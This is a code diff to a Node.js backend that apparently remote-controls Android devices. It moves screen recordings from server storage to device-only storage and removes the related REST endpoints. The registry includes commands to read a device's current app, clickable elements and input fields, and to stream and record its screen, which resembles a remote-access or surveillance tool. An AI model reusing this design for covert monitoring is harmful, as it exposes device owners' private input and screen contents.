@@ -111,9 +111,7 @@ const CMD_TIMEOUT_MS = 45000;   // ms – command timeout (45 s); was 60 s
 // ============================================
 // RECORDINGS STORAGE
 // ============================================
-const RECORDINGS_DIR = path.join(__dirname, 'recordings');
-if (!fs.existsSync(RECORDINGS_DIR)) fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
-const activeRecordings = new Map(); // deviceId → { frames:[], startTime }
+// Recordings are stored ONLY on the Android device, not on the server.
 
 // ============================================
 // COMMAND REGISTRY  (all cmds from SocketManager.java)
@@ -202,9 +200,10 @@ const COMMANDS = {
     get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
     get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
     get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
-    // Screen Reader Recordings (server-side, handled by backend filesystem)
+    // Screen Reader Recordings (forwarded to device — recordings stored on Android only)
     list_screen_recordings:    { category: 'screen_reader',label: 'List Screen Recordings',icon: '🎞' },
     get_screen_recording:      { category: 'screen_reader',label: 'Get Screen Recording',  icon: '📥' },
+    delete_screen_recording:   { category: 'screen_reader',label: 'Delete Screen Recording',icon: '🗑' },
     // Accessibility check
     get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
     // Streaming
@@ -596,34 +595,19 @@ async function processMessage(clientId, clientType, event, data) {
         return;
     }
 
-    // ── Offline recording upload from Android (buffered while disconnected) ──
+    // ── Offline recording notification from Android ──
+    // Recordings are stored ONLY on the Android device.
+    // Server just notifies the dashboard so it can refresh its list from the device.
     if (event === 'offline_recording:save') {
         const conn = tcpClients.get(clientId);
         const deviceId = conn?.deviceId || data?.deviceId;
-        if (deviceId && data?.frames && Array.isArray(data.frames) && data.frames.length > 0) {
-            try {
-                const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-                const deviceDir = path.join(RECORDINGS_DIR, safeId);
-                if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-                const filename = `sr_${Date.now()}.json`;
-                const record = {
-                    deviceId,
-                    frames: data.frames,
-                    label: data.label || `Offline Recording ${new Date(data.startTime || Date.now()).toLocaleTimeString()}`,
-                    startTime: data.startTime || Date.now(),
-                    endTime: data.endTime || Date.now(),
-                    frameCount: data.frameCount || data.frames.length,
-                };
-                fs.writeFileSync(path.join(deviceDir, filename), JSON.stringify(record));
-                broadcastDash('offline_recording:saved', {
-                    deviceId, filename,
-                    frameCount: record.frameCount,
-                    label: record.label,
-                });
-                console.log(`Offline recording saved: ${filename} (${record.frameCount} frames) for device ${deviceId}`);
-            } catch (e) {
-                console.error('offline_recording:save error: ' + e.message);
-            }
+        if (deviceId) {
+            broadcastDash('offline_recording:saved', {
+                deviceId,
+                frameCount: data?.frameCount || 0,
+                label: data?.label || '',
+            });
+            log('TCP', `Recording saved on device ${deviceId} (${data?.frameCount || 0} frames) — not stored on server`);
         }
         return;
     }
@@ -650,9 +634,6 @@ async function processMessage(clientId, clientType, event, data) {
         if (data.screenWidth)  frameMsg.screenWidth  = data.screenWidth;
         if (data.screenHeight) frameMsg.screenHeight = data.screenHeight;
         broadcastDash('stream:frame', frameMsg);
-        // Buffer if server-side recording is active
-        const rec = activeRecordings.get(deviceId);
-        if (rec) rec.frames.push({ frameData, timestamp: data.timestamp || now });
         return;
     }
 
@@ -924,37 +905,7 @@ app.post('/api/dashboard/ping', (req, res) => {
     res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
 });
 
-// ── Recording start/stop via HTTP ─────────────────────────────────────────────
-app.post('/api/recordings/:deviceId/start', (req, res) => {
-    const { deviceId } = req.params;
-    if (!activeRecordings.has(deviceId)) {
-        activeRecordings.set(deviceId, { frames: [], startTime: Date.now() });
-    }
-    broadcastDash('recording:started', { deviceId });
-    res.json({ success: true, deviceId });
-});
-
-app.post('/api/recordings/:deviceId/stop', (req, res) => {
-    const { deviceId } = req.params;
-    const rec = activeRecordings.get(deviceId);
-    if (!rec) return res.status(404).json({ success: false, error: 'No active recording' });
-    activeRecordings.delete(deviceId);
-    try {
-        const deviceDir = path.join(RECORDINGS_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
-        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-        const filename = `rec_${Date.now()}.json`;
-        const filePath = path.join(deviceDir, filename);
-        fs.writeFileSync(filePath, JSON.stringify({
-            deviceId, startTime: rec.startTime, endTime: Date.now(),
-            frameCount: rec.frames.length, frames: rec.frames
-        }));
-        broadcastDash('recording:saved', { deviceId, filename, frameCount: rec.frames.length });
-        res.json({ success: true, deviceId, filename, frameCount: rec.frames.length });
-    } catch (e) {
-        broadcastDash('recording:error', { deviceId, message: e.message });
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
+// Recordings are stored ONLY on the Android device — no server-side recording endpoints.
 
 // ============================================
 // REST ENDPOINTS
@@ -1013,68 +964,10 @@ app.post('/api/commands', async (req, res) => {
     if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
     if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });
 
-    // ── Server-side commands: list_screen_recordings — served from backend filesystem (no device needed) ──
-    if (command === 'list_screen_recordings') {
-        const commandId = crypto.randomBytes(12).toString('hex');
-        const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-        const deviceDir = path.join(RECORDINGS_DIR, safeId);
-        let recordings = [];
-        try {
-            if (fs.existsSync(deviceDir)) {
-                const files = fs.readdirSync(deviceDir).filter(f => f.endsWith('.json'));
-                recordings = files.map(f => {
-                    const fp = path.join(deviceDir, f);
-                    const stat = fs.statSync(fp);
-                    let extra = {};
-                    try {
-                        const raw = JSON.parse(fs.readFileSync(fp, 'utf8'));
-                        extra = { label: raw.label, frameCount: raw.frameCount, startTime: raw.startTime, endTime: raw.endTime };
-                    } catch (_) {}
-                    return { filename: f, size: stat.size, modified: stat.mtime, ...extra };
-                }).sort((a, b) => new Date(b.modified) - new Date(a.modified));
-            }
-        } catch (e) { log('CMD', `list_screen_recordings error: ${e.message}`, 'warn'); }
-        broadcastDash('command:result', {
-            commandId, command: 'list_screen_recordings', deviceId, success: true,
-            response: JSON.stringify({ recordings }), timestamp: new Date()
-        });
-        res.json({ success: true, commandId, command, deviceId, status: 'executing', timestamp: new Date() });
-        return;
-    }
+    // ── All commands (including list_screen_recordings / get_screen_recording / delete_screen_recording)
+    //    are forwarded to the device — recordings are stored ONLY on Android ──
 
-    // ── Special: get_screen_recording — served from backend filesystem ──
-    if (command === 'get_screen_recording') {
-        const commandId = crypto.randomBytes(12).toString('hex');
-        const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-        const filename = (params || {}).filename;
-        if (!filename) {
-            return res.status(400).json({ error: 'filename param required' });
-        }
-        const safeName = path.basename(filename);
-        const fp = path.join(RECORDINGS_DIR, safeId, safeName);
-        let data = null;
-        try {
-            if (fs.existsSync(fp)) {
-                data = JSON.parse(fs.readFileSync(fp, 'utf8'));
-            }
-        } catch (e) { log('CMD', `get_screen_recording error: ${e.message}`, 'warn'); }
-        if (data) {
-            broadcastDash('command:result', {
-                commandId, command: 'get_screen_recording', deviceId, success: true,
-                response: JSON.stringify({ ...data, filename: safeName }), timestamp: new Date()
-            });
-            res.json({ success: true, commandId, command, deviceId, status: 'executing', timestamp: new Date() });
-        } else {
-            broadcastDash('command:result', {
-                commandId, command: 'get_screen_recording', deviceId, success: false,
-                error: 'Recording not found', timestamp: new Date()
-            });
-            res.json({ success: false, commandId, command, deviceId, error: 'Recording not found', timestamp: new Date() });
-        }
-        return;
-    }
-
-    // ── For all remaining commands: require device to be online ──
+    // ── For all commands: require device to be online ──
     const tcpConnId = deviceToTcp.get(deviceId);
     const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
     if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
@@ -1198,81 +1091,8 @@ app.get('/api/admin/users', async (req, res) => {
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-// ── Recordings REST API ─────────────────────────────────────────────
-app.get('/api/recordings/:deviceId', (req, res) => {
-    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-    const deviceDir = path.join(RECORDINGS_DIR, safeId);
-    if (!fs.existsSync(deviceDir)) return res.json({ recordings: [] });
-    try {
-        const files = fs.readdirSync(deviceDir).filter(f => f.endsWith('.json'));
-        const recordings = files.map(f => {
-            const fp = path.join(deviceDir, f);
-            const stat = fs.statSync(fp);
-            let extra = {};
-            try {
-                const raw = JSON.parse(fs.readFileSync(fp, 'utf8'));
-                extra = { frameCount: raw.frameCount, startTime: raw.startTime, endTime: raw.endTime };
-            } catch (_) {}
-            return { filename: f, size: stat.size, modified: stat.mtime, ...extra };
-        }).sort((a, b) => new Date(b.modified) - new Date(a.modified));
-        res.json({ recordings });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
-
-app.delete('/api/recordings/:deviceId/:filename', (req, res) => {
-    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-    const safeName = path.basename(req.params.filename);
-    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
-    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
-    try { fs.unlinkSync(fp); res.json({ success: true }); }
-    catch (e) { res.status(500).json({ error: e.message }); }
-});
-
-app.get('/api/recordings/:deviceId/:filename', (req, res) => {
-    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-    const safeName = path.basename(req.params.filename);
-    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
-    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
-    res.download(fp);
-});
-
-app.get('/api/recordings/:deviceId/:filename/view', (req, res) => {
-    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-    const safeName = path.basename(req.params.filename);
-    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
-    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
-    try {
-        const data = JSON.parse(fs.readFileSync(fp, 'utf8'));
-        res.json(data);
-    } catch (e) { res.status(500).json({ error: e.message }); }
-});
-
-app.post('/api/recordings/:deviceId/save', express.json({ limit: '50mb' }), (req, res) => {
-    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
-    const { frames, label, startTime, endTime, frameCount } = req.body || {};
-    if (!frames || !Array.isArray(frames)) {
-        return res.status(400).json({ error: 'frames array required' });
-    }
-    try {
-        const deviceDir = path.join(RECORDINGS_DIR, safeId);
-        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-        const filename = `sr_${Date.now()}.json`;
-        const filePath = path.join(deviceDir, filename);
-        fs.writeFileSync(filePath, JSON.stringify({
-            deviceId: req.params.deviceId,
-            label: label || `Recording ${new Date().toLocaleTimeString()}`,
-            startTime: startTime || Date.now(),
-            endTime: endTime || Date.now(),
-            frameCount: frameCount || frames.length,
-            frames
-        }));
-        res.json({ success: true, filename, frameCount: frames.length });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
+// Recordings are stored ONLY on the Android device.
+// Use list_screen_recordings / get_screen_recording / delete_screen_recording commands via /api/commands.
 
 // ── Runtime Logs API ──────────────────────────────────────────────────────────
 app.get('/api/logs', (req, res) => {
